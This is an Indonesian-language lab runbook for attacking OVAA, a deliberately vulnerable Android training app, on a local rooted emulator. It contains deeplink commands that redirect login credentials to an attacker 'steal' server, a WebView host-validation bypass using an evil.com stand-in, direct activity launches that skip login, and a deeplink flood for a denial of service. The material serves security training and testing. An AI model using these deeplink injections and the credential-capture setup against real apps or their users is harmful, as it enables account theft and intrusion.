## TAHAP 1: SETUP & BUILD

1. Clone OVAA repository jika belum ada:
   cd /tmp && git clone https://github.com/oversecured/ovaa.git && cd ovaa

2. Konfigurasi SDK:
   echo "sdk.dir=/home/d4x13/Android/Sdk" > local.properties

3. Tambahkan android:usesCleartextTraffic="true" ke <application> di AndroidManifest.xml
   agar HTTP POST ke server attacker tidak diblokir oleh cleartext policy Android API 36.

4. Build APK:
   export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
   export ANDROID_SDK_ROOT=/home/d4x13/Android/Sdk
   chmod +x gradlew && ./gradlew assembleDebug --no-daemon

5. Install ke emulator:
   adb install -r app/build/outputs/apk/debug/app-debug.apk

6. Verifikasi:
   adb shell pm list packages | grep ovaa
   adb shell su root id (pastikan uid=0)

## TAHAP 2: START ATTACKER SERVER

Jalankan server Python pada port 8080 untuk menangkap kredensial yang dikirim OVAA via POST.
Server harus:
- Listen di 0.0.0.0:8080
- Menerima POST /steal dengan JSON body {"email":"...","password":"..."}
- Menyediakan GET /view yang menampilkan kredensial dalam halaman HTML
- Menyimpan hasil tangkapan ke evidence/captured_credentials.txt

Gunakan: python3 steal_server.py (atau buat file ini jika belum ada)
Jalankan di background: nohup python3 steal_server.py > /tmp/steal.log 2>&1 &

## TAHAP 3: EKSPLOITASI TC01 - Arbitrary login_url Injection

1. Clear aplikasi dan logcat:
   adb shell pm clear oversecured.ovaa
   adb logcat -c

2. Kirim deeplink untuk injeksi login_url:
   adb shell am start -a android.intent.action.VIEW \
     -d "oversecured://ovaa/login?url=http://10.0.2.2:8080/steal" \
     oversecured.ovaa

3. Verifikasi login_url berubah di SharedPreferences:
   adb shell su root cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml
   Harus muncul: <string name="login_url">http://10.0.2.2:8080/steal</string>

## TAHAP 4: EKSPLOITASI TC02 - WebView Host Validation Bypass

Kirim deeplink untuk bypass validasi host:
   adb shell am start -a android.intent.action.VIEW \
     -d "oversecured://ovaa/webview?url=https://evil.com.example.com/steal" \
     oversecured.ovaa

Verifikasi bahwa WebViewActivity terpicu (cek logcat/dumpsys).

## TAHAP 5: EKSPLOITASI TC03 - Credential Leakage + Network Capture

1. Launch aplikasi ke login screen:
   adb shell monkey -p oversecured.ovaa -c android.intent.category.LAUNCHER 1
   sleep 3

2. Input email victim@company.com:
   - Tap email field: adb shell input tap 710 479; sleep 0.3
   - Ketik "victim": adb shell input text "victim"
   - Ketik "@": adb shell input keyevent 77
   - Ketik "company": adb shell input text "company"
   - Ketik ".": adb shell input keyevent 56
   - Ketik "com": adb shell input text "com"

3. Input password SuperSecret123!:
   - Tap password field: adb shell input tap 710 660; sleep 0.3
   - Ketik "SuperSecret123": adb shell input text "SuperSecret123"
   - Ketik "!": adb shell input text '\!'  (gunakan single quote + backslash)

4. Tutup keyboard (keyboard menutupi tombol LOGIN):
   adb shell input keyevent 4
   sleep 1.5

5. Klik tombol LOGIN:
   adb shell input tap 540 2096
   sleep 4

6. Verifikasi login berhasil - MainActivity harus tampil:
   adb shell dumpsys activity top | grep ACTIVITY

## TAHAP 6: EKSPLOITASI TC04 - Arbitrary Activity Launch

1. Launch MainActivity langsung (bypass login):
   adb shell am start -a oversecured.ovaa.action.ACTIVITY_MAIN oversecured.ovaa

2. Launch LoginActivity langsung:
   adb shell am start -a oversecured.ovaa.action.LOGIN oversecured.ovaa

## TAHAP 7: EKSPLOITASI TC05 - State Inconsistency / DoS

Kirim 5x sekuens deeplink secara cepat:
   for i in 1 2 3 4 5; do
     adb shell am start -a android.intent.action.VIEW \
       -d "oversecured://ovaa/logout" oversecured.ovaa
     sleep 0.1
     adb shell am start -a android.intent.action.VIEW \
       -d "oversecured://ovaa/login?url=http://evil${i}.com/" oversecured.ovaa
     sleep 0.1
   done

Periksa crash: adb logcat -d | grep -iE "crash|FATAL|ANR"

## CATATAN PENTING
- Karakter @ dan ! TIDAK bisa via 'adb shell input text' biasa. Gunakan:
  - @ → adb shell input keyevent 77
  - ! → adb shell input text '\!'  (zsh: single quote + backslash)
- Keyboard Android menutupi tombol LOGIN. Selalu tutup keyboard (keyevent 4) sebelum tap tombol.
- 10.0.2.2 adalah alamat host machine dari perspektif emulator Android.
- Emulator HARUS rooted untuk membaca /data/data/oversecured.ovaa/shared_prefs/
- Android API 36 memblokir cleartext HTTP. usesCleartextTraffic="true" WAJIB ditambahkan.
